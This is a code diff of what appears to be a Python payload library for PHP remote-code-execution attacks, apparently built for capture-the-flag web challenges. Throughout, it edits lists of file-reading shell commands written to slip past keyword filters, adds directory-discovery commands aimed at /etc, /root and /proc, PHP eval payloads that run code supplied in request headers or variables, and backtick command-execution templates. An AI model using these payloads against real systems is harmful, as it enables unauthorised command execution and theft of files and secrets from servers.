@@ -1,4 +1,4 @@
-READFILE_TEMPLATES = [
+﻿READFILE_TEMPLATES = [
     "cat {path}",
     "tac {path}",
     "nl {path}",
@@ -17,13 +17,9 @@ READFILE_TEMPLATES = [
     "base64 {path}",
     "awk '1' {path}",
     "dd if={path}",
-    "ls {path}",
     "ca\\t {path}",
     "ca''t {path}",
     "a=ca;b=t;$a$b {path}",
-    "b=l;c=s;d={path};$b$c $d",
-    "echo `tac {path}`",
-    "print(`cat {path}`)",
     "show_source('{path}')",
     "highlight_file('{path}')",
     "readgzfile('{path}')",
@@ -39,6 +35,22 @@ READ_ENV_TEMPLATES = [
 
 ROOT_DISCOVERY_TEMPLATES = [
     "diff / /home",
+    "diff / /root",
+    "diff / /tmp",
+    "diff / /var",
+    "diff / /etc",
+    "diff / /usr",
+    "diff / /opt",
+    "diff / /proc",
+    "diff / /dev",
+    "diff / /bin",
+    "diff / /sbin",
+    "diff / /srv",
+    "diff / /run",
+    "diff / /mnt",
+    "diff / /media",
+    "ls /",
+    "b=l;c=s;d=/;$b$c $d",
 ]
 
 REFLECT_SHELL_TEMPLATES = [
@@ -117,6 +129,7 @@ HEADER_TIP_TRIGGER_PAYLOADS = {
     "eval(next(getallheaders()));",
 }
 
+# 触发变量劫持的提示
 VARIABLE_HIJACK_TIP_TRIGGER_PAYLOADS = {
     "eval(array_pop(next(get_defined_vars())));",
 }
@@ -190,6 +203,8 @@ PHP_EXEC_WRAPPERS = [
     "passthru",
     "shell_exec",
     "exec",
+    "popen",
+    "proc_open",
 ]
 
 # 短标签
@@ -200,7 +215,17 @@ SHORT_TAG_TEMPLATES = [
 
 # 反引号
 BACKTICK_TEMPLATES = [
-    "`cat {path}`",
+    "`{cmd}`",
+    "echo `{cmd}`;",
+    "print(`{cmd}`);",
+    "var_dump(`{cmd}`);",
+    "die(`{cmd}`);",
+    "exit(`{cmd}`);",
+]
+
+BACKTICK_COMMAND_TEMPLATES = [
+    "cat {path}",
+    "tac {path}",
 ]
 
 INCLUDE_TEMPLATES = [
